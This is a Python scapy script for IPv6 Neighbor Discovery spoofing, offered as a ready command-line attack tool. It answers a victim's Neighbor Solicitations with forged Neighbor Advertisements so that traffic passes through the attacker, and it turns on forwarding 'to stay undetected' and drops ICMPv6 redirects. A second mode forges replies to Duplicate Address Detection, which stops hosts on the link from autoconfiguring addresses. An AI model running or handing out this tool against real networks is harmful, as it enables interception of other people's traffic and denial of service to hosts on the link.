#!/usr/bin/python3
import argparse
import logging
import os
import random
import sys
from collections import Counter

import netifaces
from scapy.arch import get_if_hwaddr
from scapy.layers.inet6 import IPv6, ICMPv6ND_NS, ICMPv6ND_NA, ICMPv6NDOptDstLLAddr
from scapy.layers.l2 import Ether
from scapy.sendrecv import sniff, sendp

from validate_parameters import is_valid_mac, is_valid_ipv6


def parameter():
    parser = argparse.ArgumentParser(description="|> Spoofing every Neighbor Solicitation message from specified "
                                                 "target with a fake Neighbor Advertisement message (similar to ARP "
                                                 "spoofing in IPv4). It also has option to prevent autoconfiguration "
                                                 "of hosts.")
    parser.add_argument("interface", nargs="?", help="the network interface to use from the sender.")
    parser.add_argument("-tmac", dest="target_mac", action="store",
                        help="the fake MAC address (resolved from network interface when skipping).")
    parser.add_argument("-vip", dest="victim_ip", action="store",
                        help="the IPv6 address of the victim. It is the host who sends NS message (all "
                             "hosts if skipping).")
    parser.add_argument("-R", dest="r_flag", action="store_true", default=False,
                        help="the R flag (Router).")
    parser.add_argument("-S", dest="s_flag", action="store_true", default=False, help="the S flag (Solicited).")
    parser.add_argument("-O", dest="o_flag", action="store_true", default=False,
                        help="the O flag (Override).")
    parser.add_argument("-fwd", dest="forward", action="store_true", default=False, help="the option to forward "
                                                                                         "traffic through attacker.")
    parser.add_argument("-red", dest="redirect_drop", action="store_true", default=False,
                        help="the option to not allow attacker to send Redirect for telling victim to use correct MAC "
                             "address.")
    parser.add_argument("-dad", dest="dad", action="store_true", default=False,
                        help="the option to prevent specified host(s) on the local link from autoconfiguring its "
                             "address.")
    parser.add_argument("-t", dest="time", action="store", type=int, help="the time lasting the attack.")
    args = parser.parse_args()

    # Validate the input
    if len(sys.argv) <= 1:
        parser.print_help()
        sys.exit(1)

    flag = False
    # Validate the network interface
    if not args.interface:
        print("---> Network interface is required!!!")
        parser.print_help()
        sys.exit(1)
    interface_list = netifaces.interfaces()
    while True:
        if args.interface in interface_list:
            break
        else:
            print("---> The given interface is invalid. Try again!!!")
            sys.exit(1)

    # Validate the target MAC address
    if args.target_mac is None:
        args.target_mac = get_if_hwaddr(args.interface)
    if args.target_mac is not None:
        if not is_valid_mac(args.target_mac):
            print("---> The given target MAC address is invalid. Try again!!!")
            flag = True

    # Validate the victim IPv6 address
    if args.victim_ip is not None:
        if not is_valid_ipv6(args.victim_ip):
            print("---> The given victim IPv6 address is invalid. Try again!!!")
            flag = True

    # Validate the R flag
    if not args.r_flag:
        args.r_flag = 0
    if args.r_flag:
        args.r_flag = 1

    # Validate the S flag
    if not args.s_flag:
        args.s_flag = 0
    if args.s_flag:
        args.s_flag = 1

    # Validate the O flag
    if not args.o_flag:
        args.o_flag = 0
    if args.o_flag:
        args.o_flag = 1

    # Validate the time lasting attack
    if args.time is not None:
        if args.time < 0:
            print("---> The given time is invalid. Try again!!!")
            flag = True

    if flag:
        sys.exit(1)

    return args.interface, args.target_mac, args.victim_ip, args.r_flag, args.s_flag, args.o_flag, args.forward, args.redirect_drop, args.dad, args.time


def generate(interface, target_mac, victim_ip, r_flag, s_flag, o_flag, fwd, red, dad, time):
    # Validate the option forwarding and dropping Redirect messages
    if fwd:
        # Forward all packets to its real destination to stay undetected by end-users
        command = 'sysctl -w net.ipv6.conf.all.forwarding=1'
        os.system(command)
        print("........................................................................................")

    if red:
        command = 'ip6tables -A OUTPUT -p icmpv6 --icmpv6-type redirect -j DROP'
        os.system(command)
        print('ip6tables -A OUTPUT -p icmpv6 --icmpv6-type redirect -j DROP')
        print("........................................................................................")

    # Define our Custom Action function
    packet_counts = Counter()
    my_iplist = ["::"]
    for i in range(len(netifaces.ifaddresses(interface)[netifaces.AF_INET6])):
        source_ip = netifaces.ifaddresses(interface)[netifaces.AF_INET6][i]['addr']
        source_ip = source_ip.replace("%", '')
        source_ip = source_ip.replace(interface, '')
        my_iplist.append(source_ip)
        mac_list = []

    def custom_action(packet):
        if packet[0][1].src not in my_iplist and not dad:
            # Create tuple of Src/Dst in sorted order
            key = tuple(sorted([packet[0][1].src, packet[0][1].dst]))
            packet_counts.update([key])
            # Generating packet
            layer2 = Ether(src=target_mac, dst=packet[0].src)
            layer3 = IPv6(src=packet[0][ICMPv6ND_NS].tgt, dst=packet[0][1].src)
            packet1 = layer2 / layer3 / ICMPv6ND_NA(R=r_flag, S=s_flag, O=o_flag,
                                                    tgt=packet[0][ICMPv6ND_NS].tgt) / ICMPv6NDOptDstLLAddr(
                lladdr=target_mac)
            sendp(packet1, verbose=False, iface=interface)
            return f"+ Spoofing to the host: {packet[0][1].src}\n   as pretending to be: " \
                   f"{packet[0][ICMPv6ND_NS].tgt}"

    def custom_action_dad(packet):
        # Create tuple of Src/Dst in sorted order
        if packet[0][1].src == "::":
            key = tuple(sorted([packet[0][1].src, packet[0][1].dst]))
            packet_counts.update([key])
            if packet[0].src not in mac_list:
                mac_list.append(packet[0].src)
            # Generating packet
            random_mac = "02:03:00:%02x:%02x:%02x" % (random.randint(0, 255),
                                                      random.randint(0, 255),
                                                      random.randint(0, 255))
            layer2 = Ether(src=random_mac)
            layer3 = IPv6(src=packet[0][ICMPv6ND_NS].tgt, dst="ff02::1")
            packet1 = layer2 / layer3 / ICMPv6ND_NA(R=r_flag, S=s_flag, O=o_flag, tgt=packet[0][ICMPv6ND_NS].tgt) / ICMPv6NDOptDstLLAddr(
                lladdr=random_mac)
            sendp(packet1, verbose=False, iface=interface)
            return f"+ Preventing a host number #{sum(packet_counts.values())} from getting address: " \
                   f"{packet[0][ICMPv6ND_NS].tgt}"

    # Setup sniff, filtering for IP traffic to see the result
    if dad:
        print("Initializing to prevent new IPv6 hosts on the local link from autoconfiguring IPv6 address ("
              "press Ctrl+C to stop the process).....")
    else:
        print("Initializing Neighbor Advertisement spoof attack (press Ctrl+C to stop the process).....")

    if victim_ip is not None and not dad:
        build_filter = "icmp6 and ip6[40] == 135 and ip6 src %s" % victim_ip
    if victim_ip is not None and dad:
        print("---> The IPv6 address of victim is ignored!!!")
        build_filter = "icmp6 and ip6[40] == 135"
    if victim_ip is None:
        build_filter = "icmp6 and ip6[40] == 135"

    try:
        if time is not None:
            if not dad:
                sniff(iface=interface, filter=build_filter, prn=custom_action, timeout=time)
            if dad:
                sniff(iface=interface, filter=build_filter, prn=custom_action_dad, timeout=time)
        else:
            if not dad:
                sniff(iface=interface, filter=build_filter, prn=custom_action)
            if dad:
                sniff(iface=interface, filter=build_filter, prn=custom_action_dad)
    except KeyboardInterrupt:
        sys.exit(0)

    # Considering prevention when using DAD attack
    if dad:
        num_hosts = len(mac_list)
        print("===> Prevented: " + str(num_hosts) + " host(s) from getting IPv6 address during autoconfiguration.\n")


if __name__ == "__main__":
    # Turning off logging
    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
    interface, target_mac, victim_ip, r_flag, s_flag, o_flag, fwd, red, dad, time = parameter()
    generate(interface, target_mac, victim_ip, r_flag, s_flag, o_flag, fwd, red, dad, time)

    # Delete forwarding if it is set after the attack
    if fwd:
        command = 'sysctl -w net.ipv6.conf.all.forwarding=0'
        os.system(command)
    if red:
        command = 'ip6tables -D OUTPUT -p icmpv6 --icmpv6-type redirect -j DROP'
        os.system(command)
